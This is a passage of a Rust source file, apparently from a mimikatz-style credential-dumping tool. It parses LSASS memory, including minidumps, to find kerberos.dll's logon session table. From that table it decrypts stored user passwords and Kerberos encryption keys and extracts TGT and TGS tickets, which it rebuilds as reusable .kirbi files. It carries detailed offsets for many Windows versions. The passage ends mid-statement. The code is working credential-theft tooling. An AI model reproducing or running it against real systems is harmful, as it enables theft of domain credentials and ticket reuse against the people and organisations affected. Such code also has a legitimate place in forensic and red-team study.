use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, KerberosCredential, KerberosKey, KerberosTicket, KerberosTicketType, read_ptr, read_ustring, is_valid_user_ptr};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Kerberos session offsets per Windows version.
/// AVL OrderedPointer at node+0x20 (x64) / +0x10 (x86) points to session data.
struct KerbOffsets {
    luid: u64,
    /// Offset to inline KIWI_KERBEROS_PRIMARY_CREDENTIAL (not a pointer)
    credentials: u64,
    /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
    cred_password: u64,
    /// Pointer to KIWI_KERBEROS_KEYS_LIST_6 (AES/DES keys)
    key_list_ptr: u64,
    /// Offsets to ticket linked lists (LIST_ENTRY) within session entry.
    /// Each list: Flink/Blink (16 bytes). Flink points to the next
    /// KIWI_KERBEROS_INTERNAL_TICKET (at its Flink field).
    tickets_1: u64, // TGT
    tickets_2: u64, // TGS
    tickets_3: u64, // Client
}

/// Kerberos key hash entry offsets per Windows version.
pub struct KerbKeyEntryOffsets {
    /// Size of each KERB_HASHPASSWORD entry
    pub entry_size: u64,
    /// Offset to KERB_HASHPASSWORD_GENERIC within the entry
    pub generic_offset: u64,
}

/// Win10 1607+: KERB_HASHPASSWORD_6_1607 (0x38 bytes, generic at 0x20)
pub const KEY_ENTRY_1607: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
    entry_size: 0x38,
    generic_offset: 0x20,
};

/// Pre-1607 (Win7/8/Win10-1507): KERB_HASHPASSWORD_6 (0x30 bytes, generic at 0x18)
pub const KEY_ENTRY_PRE1607: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
    entry_size: 0x30,
    generic_offset: 0x18,
};

/// Offsets within KIWI_KERBEROS_INTERNAL_TICKET (per version).
struct TicketOffsets {
    service_name_ptr: u64,
    domain_name: u64,
    target_domain_name: u64,
    client_name_ptr: u64,
    ticket_flags: u64,
    key_type: u64,
    key_length: u64,
    key_value: u64,
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    ticket_enc_type: u64,
    ticket_kvno: u64,
    ticket_length: u64,
    ticket_value: u64,
}

/// Multiple offset variants for different Windows versions.
const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
    // Win10 1607+ / Win11 (pre-24H2): KIWI_KERBEROS_LOGON_SESSION_10_1607
    KerbOffsets {
        luid: 0x48,
        credentials: 0x88,
        cred_password: 0x30,
        key_list_ptr: 0x118,
        tickets_1: 0x128,
        tickets_2: 0x140,
        tickets_3: 0x158,
    },
    // Win11 24H2+: KIWI_KERBEROS_LOGON_SESSION_10_1607 without unk13 PVOID
    // All offsets shift -0x10 from variant 0 (unk13 removed, unk1 changed from PVOID to ULONG)
    KerbOffsets {
        luid: 0x40,
        credentials: 0x78,
        cred_password: 0x30,
        key_list_ptr: 0x108,
        tickets_1: 0x118,
        tickets_2: 0x130,
        tickets_3: 0x148,
    },
    // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10
    KerbOffsets {
        luid: 0x48,
        credentials: 0x88,
        cred_password: 0x28,
        key_list_ptr: 0x108,
        tickets_1: 0x118,
        tickets_2: 0x130,
        tickets_3: 0x148,
    },
    // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION (session_10 variant)
    KerbOffsets {
        luid: 0x40,
        credentials: 0x80,
        cred_password: 0x28,
        key_list_ptr: 0xD8,
        tickets_1: 0xE8,
        tickets_2: 0x100,
        tickets_3: 0x118,
    },
    // Win7: KIWI_KERBEROS_LOGON_SESSION
    KerbOffsets {
        luid: 0x18,
        credentials: 0x50,
        cred_password: 0x28,
        key_list_ptr: 0x90,
        tickets_1: 0xA0,
        tickets_2: 0xB8,
        tickets_3: 0xD0,
    },
];

/// Ticket structure offsets for Win10 1607+ (KIWI_KERBEROS_INTERNAL_TICKET_10_1607).
const TICKET_OFFSETS_1607: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,

    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x90,
    ticket_flags: 0xA0,
    key_type: 0xB0,
    key_length: 0xB8,
    key_value: 0xC0,
    start_time: 0xE8,
    end_time: 0xF0,
    renew_until: 0xF8,
    ticket_enc_type: 0x124,
    ticket_kvno: 0x128,
    ticket_length: 0x130,
    ticket_value: 0x138,
};

/// Ticket offsets for Win10 1507-1511 / Win11 (KIWI_KERBEROS_INTERNAL_TICKET_10).
/// Same as _6 but with KDCServer+unk10586_d LSA_UNICODE_STRINGs before ClientName.
const TICKET_OFFSETS_10: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,

    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x90,
    ticket_flags: 0xA0,
    key_type: 0xB0,
    key_length: 0xB8,
    key_value: 0xC0,
    start_time: 0xD8,
    end_time: 0xE0,
    renew_until: 0xE8,
    ticket_enc_type: 0x110,
    ticket_kvno: 0x114,
    ticket_length: 0x118,
    ticket_value: 0x120,
};

/// Ticket offsets for Win7/8 (KIWI_KERBEROS_INTERNAL_TICKET_6).
/// No KDCServer/unk10586_d fields, smaller layout.
const TICKET_OFFSETS_6: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,

    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x80,
    ticket_flags: 0x90,
    key_type: 0x98,
    key_length: 0xA0,
    key_value: 0xA8,
    start_time: 0xC0,
    end_time: 0xC8,
    renew_until: 0xD0,
    ticket_enc_type: 0xF8,
    ticket_kvno: 0xFC,
    ticket_length: 0x100,
    ticket_value: 0x108,
};

// -- x86 offset variants --

/// x86 Kerberos session offsets (estimated from x64 struct layout with 4-byte pointers).
/// Auto-detection validates LUID + username at runtime.
const KERB_OFFSET_VARIANTS_X86: &[KerbOffsets] = &[
    // Win10 1607+ x86
    KerbOffsets {
        luid: 0x24,
        credentials: 0x50,
        cred_password: 0x18,
        key_list_ptr: 0x8C,
        tickets_1: 0x94,
        tickets_2: 0xA0,
        tickets_3: 0xAC,
    },
    // Win10 1507-1511 x86
    KerbOffsets {
        luid: 0x24,
        credentials: 0x50,
        cred_password: 0x14,
        key_list_ptr: 0x84,
        tickets_1: 0x8C,
        tickets_2: 0x98,
        tickets_3: 0xA4,
    },
];

/// x86 key entry offsets (SIZE_T=4, PVOID=4).
const KEY_ENTRY_1607_X86: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
    entry_size: 0x20, // salt(USTRING 8) + stringToKey(PVOID 4) + void2(PVOID 4) + generic(0x10)
    generic_offset: 0x10,
};
const KEY_ENTRY_PRE1607_X86: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
    entry_size: 0x1C, // salt(USTRING 8) + stringToKey(PVOID 4) + generic(0x10)
    generic_offset: 0x0C,
};

/// x86 ticket structure offsets (Win10 1607+).
const TICKET_OFFSETS_1607_X86: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x10,
    domain_name: 0x18,
    target_domain_name: 0x20,
    client_name_ptr: 0x48,
    ticket_flags: 0x50,
    key_type: 0x5C,
    key_length: 0x60,
    key_value: 0x64,
    start_time: 0x78,
    end_time: 0x80,
    renew_until: 0x88,
    ticket_enc_type: 0x9C,
    ticket_kvno: 0xA0,
    ticket_length: 0xA4,
    ticket_value: 0xA8,
};

/// x86 ticket structure offsets (Win10 1507-1511, no KDCServer/unk10586_d).
const TICKET_OFFSETS_10_X86: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x10,
    domain_name: 0x18,
    target_domain_name: 0x20,
    client_name_ptr: 0x38,
    ticket_flags: 0x40,
    key_type: 0x4C,
    key_length: 0x50,
    key_value: 0x54,
    start_time: 0x68,
    end_time: 0x70,
    renew_until: 0x78,
    ticket_enc_type: 0x8C,
    ticket_kvno: 0x90,
    ticket_length: 0x94,
    ticket_value: 0x98,
};

/// Extract Kerberos credentials from kerberos.dll (unified x64/x86).
pub fn extract_kerberos_credentials(
    vmem: &dyn VirtualMemory,
    kerberos_base: u64,
    _kerberos_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, KerberosCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, kerberos_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };
    let text_base = kerberos_base + text.virtual_address as u64;

    // Pattern scan + resolve: x64 uses RIP-relative LEA, x86 uses absolute addressing
    let (pattern_list, pattern_label) = match arch {
        Arch::X64 => (patterns::KERBEROS_LOGON_SESSION_PATTERNS, "KerbGlobalLogonSessionTable"),
        Arch::X86 => (patterns::KERBEROS_LOGON_SESSION_PATTERNS_X86, "KerbGlobalLogonSessionTable_x86"),
    };
    let (pattern_addr, _) = match patterns::find_pattern(
        vmem, text_base, text.virtual_size, pattern_list, pattern_label,
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find Kerberos pattern: {}", e);
            return Ok(results);
        }
    };

    let table_addr = match arch {
        Arch::X64 => patterns::resolve_rip_relative(vmem, pattern_addr, 6)?,
        Arch::X86 => {
            let ds = pe.find_section(".data");
            if let Some(ds) = ds {
                let data_base = kerberos_base + ds.virtual_address as u64;
                let data_end = data_base + ds.virtual_size as u64;
                patterns::find_list_via_abs(vmem, pattern_addr, kerberos_base, data_base, data_end, "kerberos_x86")?
            } else {
                return Ok(results);
            }
        }
    };
    log::info!("Kerberos session table (RTL_AVL_TABLE) at 0x{:x} (arch={:?})", table_addr, arch);

    // RTL_AVL_TABLE: BalancedRoot = RTL_BALANCED_LINKS (ptr_size * 4 bytes)
    //   Parent at +0, LeftChild at +ptr_size, RightChild at +ptr_size*2
    //   NumberGenericTableElements at +ptr_size*4 + padding (0x2C x64, 0x18 x86)
    let ps = arch.ptr_size();
    let left_child = read_ptr(vmem, table_addr + ps, arch).unwrap_or(0);
    let right_child = read_ptr(vmem, table_addr + ps * 2, arch).unwrap_or(0);
    let num_elem_off = if arch == Arch::X64 { 0x2Cu64 } else { 0x18 };
    let num_elements = vmem.read_virt_u32(table_addr + num_elem_off).unwrap_or(0);

    log::info!("Kerberos AVL table: elements={}, Left=0x{:x}, Right=0x{:x}",
        num_elements, left_child, right_child);

    let root_node = right_child;
    if (root_node == 0 || root_node == table_addr) && (left_child == 0 || left_child == table_addr) {
        return Ok(results);
    }

    let mut nodes = Vec::new();
    walk_avl_tree(vmem, root_node, table_addr, &mut nodes, 0, arch);
    log::info!("Kerberos AVL tree: found {} nodes", nodes.len());

    let (offsets, variant_idx) = detect_kerb_offsets(vmem, &nodes, arch);

    // Select ticket and key entry offsets based on variant and arch
    let ticket_offsets = match arch {
        Arch::X64 => match variant_idx {
            0 | 1 => &TICKET_OFFSETS_1607,
            2 => &TICKET_OFFSETS_10,
            _ => &TICKET_OFFSETS_6,
        },
        Arch::X86 => if variant_idx == 0 { &TICKET_OFFSETS_1607_X86 } else { &TICKET_OFFSETS_10_X86 },
    };
    let key_entry_offsets = match arch {
        Arch::X64 => match variant_idx {
            0 | 1 => &KEY_ENTRY_1607,
            _ => &KEY_ENTRY_PRE1607,
        },
        Arch::X86 => if variant_idx == 0 { &KEY_ENTRY_1607_X86 } else { &KEY_ENTRY_PRE1607_X86 },
    };

    // OrderedPointer offset: ptr_size * 4 (0x20 on x64, 0x10 on x86)
    let ordered_ptr_off = ps * 4;

    for node_ptr in &nodes {
        let entry = match read_ptr(vmem, node_ptr + ordered_ptr_off, arch) {
            Ok(p) if is_valid_user_ptr(p, arch) => p,
            _ => continue,
        };
        let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
        if luid == 0 || luid > 0xFFFF_FFFF {
            continue;
        }

        let cred_addr = entry + offsets.credentials;
        let username = read_ustring(vmem, cred_addr, arch).unwrap_or_default();
        let domain = read_ustring(vmem, cred_addr + arch.ustr_size(), arch).unwrap_or_default();

        if !username.is_empty() && !is_plausible_username(&username) {
            continue;
        }

        let password = if !username.is_empty() {
            extract_kerb_password(vmem, cred_addr, offsets.cred_password, keys, arch)
                .unwrap_or_default()
        } else {
            String::new()
        };

        let kerb_keys = extract_kerb_keys(vmem, entry, offsets, key_entry_offsets, keys, arch);

        let mut tickets = Vec::new();
        let ticket_lists = [
            (entry + offsets.tickets_1, KerberosTicketType::Tgt),
            (entry + offsets.tickets_2, KerberosTicketType::Tgs),
            (entry + offsets.tickets_3, KerberosTicketType::Client),
        ];
        for &(list_head, ticket_type) in &ticket_lists {
            extract_tickets_from_list(vmem, list_head, ticket_type, ticket_offsets, &mut tickets, arch);
        }

        if username.is_empty() && kerb_keys.is_empty() && tickets.is_empty() {
            continue;
        }

        log::info!(
            "Kerberos: LUID=0x{:x} user={} domain={} password_len={} keys={} tickets={}",
            luid,
            if username.is_empty() { "(paged)" } else { &username },
            if domain.is_empty() { "(paged)" } else { &domain },
            password.len(), kerb_keys.len(), tickets.len()
        );

        results.push((luid, KerberosCredential {
            username, domain, password, keys: kerb_keys, tickets,
        }));
    }

    Ok(results)
}

/// Extract Kerberos encryption keys (AES128, AES256, RC4, DES) from pKeyList.
fn extract_kerb_keys(
    vmem: &dyn VirtualMemory,
    entry: u64,
    offsets: &KerbOffsets,
    key_entry_offsets: &KerbKeyEntryOffsets,
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<KerberosKey> {
    let key_list_ptr = match read_ptr(vmem, entry + offsets.key_list_ptr, arch) {
        Ok(p) if is_valid_user_ptr(p, arch) => p,
        _ => return Vec::new(),
    };

    // Read key list header: cbItem at +0x04
    let cb_item = match vmem.read_virt_u32(key_list_ptr + 0x04) {
        Ok(n) if n > 0 && n <= 32 => n as usize,
        _ => return Vec::new(),
    };

    let mut result = Vec::new();
    // Header size differs: x64 has more PVOIDs before the entries array
    let entries_base = key_list_ptr + if arch == Arch::X64 { 0x28 } else { 0x18 };

    for i in 0..cb_item {
        let entry_base = entries_base + (i as u64) * key_entry_offsets.entry_size;
        let generic_base = entry_base + key_entry_offsets.generic_offset;

        // KERB_HASHPASSWORD_GENERIC layout:
        //   +0x00: unk (u32, always 2)
        //   +0x04: Type (u32, encryption type / etype)
        //   +0x08: Size (SIZE_T: u64 on x64, u32 on x86)
        //   +0x08+sizeof(SIZE_T): Checksump (pointer to encrypted key data)
        let etype = match vmem.read_virt_u32(generic_base + 0x04) {
            Ok(t) => t,
            Err(_) => continue,
        };
        let key_size = if arch == Arch::X64 {
            match vmem.read_virt_u64(generic_base + 0x08) {
                Ok(s) if s > 0 && s <= 256 => s as usize,
                _ => continue,
            }
        } else {
            match vmem.read_virt_u32(generic_base + 0x08) {
                Ok(s) if s > 0 && s <= 256 => s as usize,
                _ => continue,
            }
        };
        let checksum_off = 0x08 + arch.ptr_size(); // +0x10 on x64, +0x0C on x86
        let checksum_ptr = match read_ptr(vmem, generic_base + checksum_off, arch) {
            Ok(p) if is_valid_user_ptr(p, arch) => p,
            _ => continue,
        };

        // Read encrypted key bytes and decrypt
        let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
            Ok(d) => d,
            Err(_) => continue,
        };
        let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Validate etype is a known Windows encryption type.
        // Unknown etypes indicate garbage data (corrupt key list entry).
        let expected_len = match etype {
            17 => 16,                              // AES128_CTS_HMAC_SHA1
            18 => 32,                              // AES256_CTS_HMAC_SHA1
            23 | 24 => 16,                         // RC4_HMAC / RC4_HMAC_EXP
            3 | 1 => 8,                            // DES_CBC_MD5 / DES_CBC_CRC
            0xFFFF_FF7B | 0xFFFF_FF79 => 16,       // RC4_HMAC_OLD (-133) / DES_PLAIN (-135)
            0xFFFF_FF80 | 0xFFFF_FF74 => 16,       // RC4_HMAC_OLD_EXP (-128) / RC4_MD4 (-140)
            _ => {
                log::debug!("  Skipping unknown Kerberos etype {:#x}", etype);
                continue;
            }
        };
        if decrypted.len() < expected_len {
            continue;
        }
        let key_bytes = decrypted[..expected_len].to_vec();

        // Skip all-zero keys
        if key_bytes.iter().all(|&b| b == 0) {
            continue;
        }

        // Skip repeating-pattern garbage (decryption artifacts from paged/corrupt data).
        // Real AES/RC4/DES keys never have short repeating cycles (p ≈ 2^-64).
        if super::msv::is_repeating_pattern_pub(&key_bytes) {
            log::debug!("  Skipping garbage Kerberos key (repeating pattern): etype={}", etype);
            continue;
        }

        log::debug!(
            "  Kerberos key: etype={} ({}) size={} key={}",
            etype,
            match etype {
                17 => "AES128",
                18 => "AES256",
                23 => "RC4",
                3 => "DES",
                _ => "?",
            },
            key_bytes.len(),
            hex::encode(&key_bytes)
        );

        result.push(KerberosKey {
            etype,
            key: key_bytes,
        });
    }

    result
}

/// Walk a doubly-linked ticket list and extract each ticket.
fn extract_tickets_from_list(
    vmem: &dyn VirtualMemory,
    list_head: u64,
    ticket_type: KerberosTicketType,
    offsets: &TicketOffsets,
    tickets: &mut Vec<KerberosTicket>,
    arch: Arch,
) {
    let flink = match read_ptr(vmem, list_head, arch) {
        Ok(f) if f != 0 && f != list_head => f,
        _ => return,
    };

    let mut current = flink;
    let mut count = 0u32;
    while current != list_head && current != 0 && count < 64 {
        count += 1;
        match extract_single_ticket(vmem, current, ticket_type, offsets, arch) {
            Some(ticket) => {
                log::debug!(
                    "Kerberos ticket: {} {} ({} bytes)",
                    ticket.ticket_type,
                    ticket.service_name.join("/"),
                    ticket.ticket_blob.len()
                );
                tickets.push(ticket);
            }
            None => {
                log::debug!("Kerberos ticket at 0x{:x}: failed to parse", current);
            }
        }
        current = read_ptr(vmem, current, arch).unwrap_or(0);
    }
}

/// Extract a single Kerberos ticket from a KIWI_KERBEROS_INTERNAL_TICKET struct.
fn extract_single_ticket(
    vmem: &dyn VirtualMemory,
    ticket_addr: u64,
    ticket_type: KerberosTicketType,
    offsets: &TicketOffsets,
    arch: Arch,
) -> Option<KerberosTicket> {
    let svc_name_ptr = read_ptr(vmem, ticket_addr + offsets.service_name_ptr, arch).ok()?;
    let (service_name, service_name_type) = read_kerb_external_name(vmem, svc_name_ptr, arch);

    let client_name_ptr = read_ptr(vmem, ticket_addr + offsets.client_name_ptr, arch).ok()?;
    let (client_name, client_name_type) = read_kerb_external_name(vmem, client_name_ptr, arch);

    let domain_name = read_ustring(vmem, ticket_addr + offsets.domain_name, arch).unwrap_or_default();
    let target_domain_name = read_ustring(vmem, ticket_addr + offsets.target_domain_name, arch).unwrap_or_default();

    // Ticket flags (stored big-endian in memory)
    let ticket_flags = vmem.read_virt_u32(ticket_addr + offsets.ticket_flags).unwrap_or(0).swap_bytes();

    // Session key
    let key_type = vmem.read_virt_u32(ticket_addr + offsets.key_type).unwrap_or(0);
    let key_length = vmem.read_virt_u32(ticket_addr + offsets.key_length).unwrap_or(0) as usize;
    let key_value_ptr = read_ptr(vmem, ticket_addr + offsets.key_value, arch).unwrap_or(0);
    let session_key = if key_length > 0 && key_length <= 256 && key_value_ptr != 0 {
        vmem.read_virt_bytes(key_value_ptr, key_length)
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    // Timestamps
    let start_time = vmem
        .read_virt_u64(ticket_addr + offsets.start_time)
        .unwrap_or(0);
    let end_time = vmem
        .read_virt_u64(ticket_addr + offsets.end_time)
        .unwrap_or(0);
    let renew_until = vmem
        .read_virt_u64(ticket_addr + offsets.renew_until)
        .unwrap_or(0);

    // Ticket encryption info
    let ticket_enc_type = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_enc_type)
        .unwrap_or(0);
    let ticket_kvno = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_kvno)
        .unwrap_or(0);

    // Ticket blob (encrypted ticket data)
    let ticket_length = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_length)
        .unwrap_or(0) as usize;
    let ticket_value_ptr = read_ptr(vmem, ticket_addr + offsets.ticket_value, arch).unwrap_or(0);
    let ticket_blob = if ticket_length > 0 && ticket_length <= 65536 && ticket_value_ptr != 0 {
        vmem.read_virt_bytes(ticket_value_ptr, ticket_length)
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    // Validate ticket quality: reject garbage or paged-out tickets
    if service_name.is_empty() && domain_name.is_empty() {
        return None;
    }
    if ticket_blob.is_empty() {
        return None;
    }
    // ticket_blob that is mostly zeros = paged out memory, not a real ticket
    let zero_count = ticket_blob.iter().filter(|&&b| b == 0).count();
    if zero_count > ticket_blob.len() * 3 / 4 {
        log::debug!(
            "Kerberos ticket at 0x{:x}: ticket_blob is {:.0}% zeros (paged out), skipping",
            ticket_addr,
            zero_count as f64 / ticket_blob.len() as f64 * 100.0
        );
        return None;
    }
    // Reject tickets with garbage key_type (valid etypes are small numbers)
    if key_type > 0xFF {
        log::debug!(
            "Kerberos ticket at 0x{:x}: invalid key_type {} (garbage), skipping",
            ticket_addr,
            key_type
        );
        return None;
    }
    // Reject tickets with all-zero timestamps
    if start_time == 0 && end_time == 0 && renew_until == 0 {
        log::debug!(
            "Kerberos ticket at 0x{:x}: all timestamps are zero (paged out), skipping",
            ticket_addr
        );
        return None;
    }

    // Build .kirbi (KRB-CRED ASN.1 DER)
    let kirbi = build_kirbi(
        &service_name,
        service_name_type,
        &client_name,
        client_name_type,
        &domain_name,
        &target_domain_name,
        ticket_flags,
        key_type,
        &session_key,
        start_time,
        end_time,
        renew_until,
        ticket_enc_type,
        ticket_kvno,
        &ticket_blob,
    );

    Some(KerberosTicket {
        ticket_type,
        service_name,
        service_name_type,
        client_name,
        client_name_type,
        domain_name,
        target_domain_name,
        ticket_flags,
        key_type,
        session_key,
        start_time,
        end_time,
        renew_until,
        ticket_enc_type,
        ticket_kvno,
        ticket_blob,
        kirbi,
    })
}

/// Read KERB_EXTERNAL_NAME structure: NameType (i16), NameCount (u16), Names (LSA_UNICODE_STRING[]).
/// x64: Names at +0x08, stride 0x10.  x86: Names at +0x04, stride 0x08.
fn read_kerb_external_name(vmem: &dyn VirtualMemory, ptr: u64, arch: Arch) -> (Vec<String>, i16) {
    if ptr == 0 || !is_valid_user_ptr(ptr, arch) {
        return (Vec::new(), 0);
    }
    let name_type = vmem.read_virt_u16(ptr).unwrap_or(0) as i16;
    let name_count = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
    if name_count == 0 || name_count > 16 {
        return (Vec::new(), name_type);
    }
    // Names array starts after NameType(2) + NameCount(2) + padding to pointer alignment
    let names_start = arch.ptr_size(); // +0x08 on x64, +0x04 on x86
    let ustr_stride = arch.ustr_size(); // 0x10 on x64, 0x08 on x86
    let mut names = Vec::with_capacity(name_count);
    for i in 0..name_count {
        let ustr_addr = ptr + names_start + (i as u64) * ustr_stride;
        let name = read_ustring(vmem, ustr_addr, arch).unwrap_or_default();
        names.push(name);
    }
    (names, name_type)
}

/// Walk an AVL tree (in-order traversal) collecting all node pointers.
/// RTL_BALANCED_LINKS: Parent at +0, Left at +ptr_size, Right at +ptr_size*2.
fn walk_avl_tree(
    vmem: &dyn VirtualMemory,
    node: u64,
    sentinel: u64,
    results: &mut Vec<u64>,
    depth: usize,
    arch: Arch,
) {
    if depth > 30 || node == 0 || node == sentinel || results.len() > 256 {
        return;
    }
    if results.contains(&node) {
        return;
    }
    let ps = arch.ptr_size();
    let left = read_ptr(vmem, node + ps, arch).unwrap_or(0);
    let right = read_ptr(vmem, node + ps * 2, arch).unwrap_or(0);
    walk_avl_tree(vmem, left, sentinel, results, depth + 1, arch);
    results.push(node);
    walk_avl_tree(vmem, right, sentinel, results, depth + 1, arch);
}

/// Check if a username looks plausible (not garbage memory).
/// Allows any printable Unicode (Latin, CJK, Cyrillic, Arabic, etc.)
/// but rejects control characters and private-use/surrogate codepoints.
fn is_plausible_username(name: &str) -> bool {
    if name.is_empty() {
        return false;
    }
    // Reject control characters (U+0000..U+001F except tab/space, U+007F..U+009F)
    // and private-use area (U+E000..U+F8FF) which indicate garbage memory.
    // Allow everything else: Latin, CJK, Cyrillic, Arabic, Hangul, etc.
    name.chars().all(|c| {
        !c.is_control() && !('\u{E000}'..='\u{F8FF}').contains(&c)
    })
}

/// Auto-detect Kerberos offset variant by probing AVL tree nodes.
/// Returns the offsets and variant index.
fn detect_kerb_offsets(vmem: &dyn VirtualMemory, nodes: &[u64], arch: Arch) -> (&'static KerbOffsets, usize) {
    let variants: &[KerbOffsets] = if arch == Arch::X64 { KERB_OFFSET_VARIANTS } else { KERB_OFFSET_VARIANTS_X86 };
    // OrderedPointer: at ptr_size * 4 (0x20 on x64, 0x10 on x86)
    let ordered_ptr_off = arch.ptr_size() * 4;
    for node_ptr in nodes {
        let entry = match read_ptr(vmem, node_ptr + ordered_ptr_off, arch) {
            Ok(p) if is_valid_user_ptr(p, arch) => p,
            _ => continue,
        };
        for (idx, variant) in variants.iter().enumerate() {
            let luid = match vmem.read_virt_u64(entry + variant.luid) {
                Ok(l) => l,
                Err(_) => continue,
            };
            if luid == 0 || luid > 0xFFFFFFFF {
                continue;
            }
            let cred_addr = entry + variant.credentials;
            let username = read_ustring(vmem, cred_addr, arch).unwrap_or_default();
            if !username.is_empty() && username.len() < 256 {
                log::debug!(
                    "Kerberos: auto-detected variant {} (luid=0x{:x} cred=0x{:x} pwd=0x{:x})",
                    idx, variant.luid, variant.credentials, variant.cred_password
                );
                return (variant, idx);
            }
        }
    }
    log::warn!("Kerberos: could not auto-detect offset variant from {} AVL nodes, defaulting to variant 0", nodes.len());
    (&variants[0], 0)
}

pub fn extract_kerb_password(
    vmem: &dyn VirtualMemory,
    cred_ptr: u64,
    password_offset: u64,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<String> {
    let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
    // Read MaximumLength (at +2 in UNICODE_STRING) for the encrypted blob size.
    // Cipher selection depends on blob size: size%8==0 → 3DES, else → AES-CFB.
    // Using Length instead of MaxLength would pick the wrong cipher.
    let pwd_max_len = vmem.read_virt_u16(cred_ptr + password_offset + 2)? as usize;
    // Buffer pointer at +ptr_size (after Length(2) + MaxLength(2) + padding)
    let pwd_ptr = read_ptr(vmem, cred_ptr + password_offset + arch.ptr_size(), arch)?;

    log::debug!(
        "extract_kerb_password: cred_ptr=0x{:x} offset=0x{:x} pwd_len={} max_len={} pwd_ptr=0x{:x}",
        cred_ptr, password_offset, pwd_len, pwd_max_len, pwd_ptr
    );

    if pwd_len == 0 || pwd_ptr == 0 {
        return Ok(String::new());
    }

    // Read MaximumLength bytes (matches pypykatz's read_maxdata)
    let read_len = if pwd_max_len >= pwd_len { pwd_max_len } else { pwd_len };
    let enc_data = vmem.read_virt_bytes(pwd_ptr, read_len)?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
    Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
}

/// Scan VirtualMemory regions for KIWI_KERBEROS_PRIMARY_CREDENTIAL structures.
/// Used as fallback when the AVL tree walk fails or returns empty.
/// Unlike the physical scan in finder.rs, this works on any VirtualMemory backend
/// (minidumps, snapshots) and doesn't require known_users filter.
pub fn scan_vmem_for_kerberos_credentials(
    vmem: &dyn VirtualMemory,
    regions: &[(u64, u64)],
    keys: &CryptoKeys,
    known_sessions: &std::collections::HashMap<u64, (String, String)>,
) -> Vec<(u64, KerberosCredential)> {
    let mut results: Vec<(u64, KerberosCredential)> = Vec::new();
    let mut seen: std::collections::HashMap<(String, String), usize> =
        std::collections::HashMap::new();
    let mut candidates: Vec<u64> = Vec::new();

    log::info!(
        "Kerberos vmem scan: searching {} memory regions for credential structures...",
        regions.len()
    );

    for &(base, size) in regions {
        if !(0x40..=0x10_000_000).contains(&size) {
            continue;
        }
        let page_data = match vmem.read_virt_bytes(base, size as usize) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Scan for KIWI_KERBEROS_PRIMARY_CREDENTIAL pattern:
        //   +0x00: UserName   (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
        //   +0x10: DomainName (UNICODE_STRING: same)
        //   +0x20: unk0 (PVOID) / or Password at +0x28 for older versions
        //   +0x30: Password   (UNICODE_STRING: encrypted) for Win10 1607+
        for off in (0..page_data.len().saturating_sub(0x40)).step_by(8) {
            let user_len = u16::from_le_bytes([page_data[off], page_data[off + 1]]) as usize;
            let user_max = u16::from_le_bytes([page_data[off + 2], page_data[off + 3]]) as usize;
            let user_pad = u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
            let user_buf =
                u64::from_le_bytes(page_data[off + 8..off + 16].try_into().unwrap());

            if user_len == 0 || user_len > 100 || !user_len.is_multiple_of(2) {
                continue;
            }
            if user_max < user_len || user_max > 0x200 || user_pad != 0 {
                continue;
            }
            if user_buf < 0x10000 || (user_buf >> 48) != 0 {
                continue;
            }

            let dom_off = off + 0x10;
            if dom_off + 0x10 > page_data.len() {
                continue;
            }
            let dom_len =
                u16::from_le_bytes([page_data[dom_off], page_data[dom_off + 1]]) as usize;
            let dom_max =
                u16::from_le_bytes([page_data[dom_off + 2], page_data[dom_off + 3]]) as usize;
            let dom_pad = u32::from_le_bytes(
                page_data[dom_off + 4..dom_off + 8].try_into().unwrap(),
            );
            let dom_buf = u64::from_le_bytes(
                page_data[dom_off + 8..dom_off + 16].try_into().unwrap(),
            );

            if dom_len == 0 || dom_len > 100 || !dom_len.is_multiple_of(2) {
                continue;
            }
            if dom_max < dom_len || dom_max > 0x200 || dom_pad != 0 {
                continue;
            }
            if dom_buf < 0x10000 || (dom_buf >> 48) != 0 {
                continue;
            }

            // Check password UNICODE_STRING at +0x30 (Win10 1607+) or +0x28 (older)
            let mut found_pwd = false;
            for &pwd_offset in &[0x30usize, 0x28] {
                let po = off + pwd_offset;
                if po + 0x10 > page_data.len() {
                    continue;
                }
                let pwd_len =
